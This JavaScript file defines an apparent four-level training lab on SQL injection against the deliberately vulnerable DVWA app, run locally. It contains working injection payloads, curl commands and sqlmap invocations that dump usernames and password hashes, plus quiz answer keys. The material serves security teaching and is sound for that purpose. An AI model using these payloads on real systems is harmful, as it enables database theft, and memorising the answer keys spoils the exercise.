const LESSONS = [
  {
    title: "Level 1: Low Security",
    points: 60,
    content: `🚀 ONE-TIME SETUP — Run this FIRST before any level
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Start your DVWA and Kali containers from the buttons above.
Inside the Kali terminal (docker exec -it <id> bash), run:

# Set your DVWA port (check the URL of your DVWA browser tab)
PORT=8206   ← replace with your actual port

# Step 1: Get CSRF token and login
TOKEN=$(curl -s -c /tmp/dvwa.txt "http://172.17.0.1:$PORT/login.php" | grep -oP "user_token' value='\\K[^']+")
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -L > /dev/null

# Step 2: Save the session ID to a variable
SID=$(grep PHPSESSID /tmp/dvwa.txt | awk '{print $NF}')
echo "Session ready: $SID"

If you see a session ID printed, you are logged in. ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 LEVEL 1 — LOW SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Set level to Low
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=low&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━━━
1. In DVWA click 'SQL Injection'. The input box sends a GET request.
2. Type these payloads one at a time:

  Confirm injectable:
    1' OR '1'='1    → shows ALL users if injectable

  Find column count (increase number until you get an error):
    1' ORDER BY 1#   → works
    1' ORDER BY 2#   → works
    1' ORDER BY 3#   → ERROR → 2 columns confirmed!

  Find which columns are displayed:
    1' UNION SELECT 1,2#    → look for '1' and '2' in output

  Extract DB info:
    1' UNION SELECT version(),user()#

  List all tables:
    1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()#

  Dump users:
    1' UNION SELECT user,password FROM users#

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Confirm injectable (should show multiple users)
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  | grep -o "First name:.*"

# Find column count — change 2 to 3 to see the error
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+ORDER+BY+2%23&Submit=Submit" \
  | grep -o "Unknown column"

# Dump username + password hash
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "What SQL keyword combines results from two SELECT queries?", a: "UNION" },
      { q: "How many columns does the DVWA sqli query return? (find with ORDER BY)", a: "2" },
      { q: "What is admin's password hash? (from UNION SELECT user,password FROM users#)", a: "5f4dcc3b5aa765d61d8327deb882cf99" },
      { q: "What plaintext password does that hash decode to?", a: "password" },
      { q: "What is the name of the database? (from UNION SELECT database(),null#)", a: "dvwa" }
    ]
  },
  {
    title: "Level 2: Medium Security",
    points: 60,
    content: `📋 LEVEL 2 — MEDIUM SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

What changed: Input is now a DROPDOWN. Sends POST request.
mysqli_real_escape_string() escapes quotes BUT the field is INTEGER — no quotes needed!

# Set level to Medium
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=medium&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD (Burp Suite)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Enable Burp Suite intercept.
2. Select a user from the dropdown → click Submit.
3. Burp shows: id=1&Submit=Submit
4. Change id to inject (NO quotes needed):
   1 UNION SELECT user,password FROM users#
5. Forward the request → see the dumped users in the response.

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Confirm injectable — should show multiple users
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 OR 1=1&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "First name:.*"

# Dump users (no quotes needed!)
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 UNION SELECT user,password FROM users#&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

# Get database name
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -d "id=1 UNION SELECT database(),user()&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" \
  --cookie="security=medium; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In Medium security, is the id parameter sent via GET or POST?", a: "POST" },
      { q: "What PHP function does DVWA Medium use to try to prevent injection?", a: "mysqli_real_escape_string" },
      { q: "Do you need single quotes when injecting into an integer-type field? (yes/no)", a: "no" },
      { q: "What is the 2nd username in the users table? (LIMIT 1,1)", a: "gordonb" },
      { q: "What is gordonb's password hash?", a: "e99a18c428cb38d5f260853678922e03" }
    ]
  },
  {
    title: "Level 3: High Security",
    points: 60,
    content: `📋 LEVEL 3 — HIGH SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

What changed: Input is on a separate POP-UP page (session-input.php).
Output appears on the MAIN page. There is also a LIMIT 1 clause — bypass with UNION.
This is called "second-order" or "split-page" SQL injection.

# Set level to High
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=high&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━━━
1. Click 'SQL Injection' → click the link to open the input POP-UP.
2. In the pop-up text box, type your payload → click Submit.
3. Close the pop-up → view the MAIN page to see the output.

  Dump users:
    1' UNION SELECT user,password FROM users#
  → Main page shows all usernames + hashes!

  Get DB info:
    1' UNION SELECT database(),user()#

🖥️  MANUAL CURL METHOD (two commands!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 1: POST the payload to the session input pop-up page
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
  -d "id=1' UNION SELECT user,password FROM users#&Submit=Submit" \
  -H "Cookie: security=high; PHPSESSID=$SID" > /dev/null

# STEP 2: Fetch the MAIN page to see the output
curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  -H "Cookie: security=high; PHPSESSID=$SID" \
  | grep -oP "First name: \\K[^<]+"

🤖 SQLMAP METHOD (use --second-url)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
  --data="id=1&Submit=Submit" \
  --second-url="http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
  --cookie="security=high; PHPSESSID=$SID" \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In High security, where is the input field located?", a: "pop-up" },
      { q: "What is the filename of the pop-up page?", a: "session-input.php" },
      { q: "What SQL clause limits High level output to 1 row?", a: "LIMIT" },
      { q: "What sqlmap flag tells it to look for output on a different URL?", a: "--second-url" },
      { q: "What is the 3rd username in the users table? (LIMIT 2,1)", a: "1337" }
    ]
  },
  {
    title: "Level 4: Impossible Security",
    points: 60,
    content: `📋 LEVEL 4 — IMPOSSIBLE SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.

# Set level to Impossible
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=impossible&seclev_submit=Submit" > /dev/null

🧠 WHY PREPARED STATEMENTS BLOCK ALL INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Vulnerable code (Low/Medium/High):
  $query = "SELECT * FROM users WHERE id='$id'";
  User input becomes part of SQL → injection works!

Impossible (PDO Prepared Statement):
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
  $stmt->bindParam(':id', $id, PDO::PARAM_INT);
  SQL structure is compiled FIRST. Input arrives only as pure data. Injection impossible.

Click 'View Source' in DVWA to see this code yourself.

🖥️  PROVE IT — Confirm all attacks fail
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Classic UNION attack — returns no data (payload treated as literal string)
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
  | grep -oP "First name: \\K[^<]+"

# OR injection — returns nothing extra
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  | grep -c "First name:"

🤖 SQLMAP — Expects "not injectable"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=impossible; PHPSESSID=$SID" \
  --batch

Expected: "[WARNING] all tested parameters do not appear to be injectable"`,
    questions: [
      { q: "What PHP database extension does the Impossible level use? (3 letters)", a: "PDO" },
      { q: "What security technique prevents injection on the Impossible level? (two words)", a: "Prepared Statements" },
      { q: "Does a UNION payload extract data on the Impossible level? (yes/no)", a: "no" },
      { q: "Will sqlmap find any injection point on the Impossible level? (yes/no)", a: "no" },
      { q: "What word does sqlmap use in its warning when no injection is found?", a: "injectable" }
    ]
  }
];
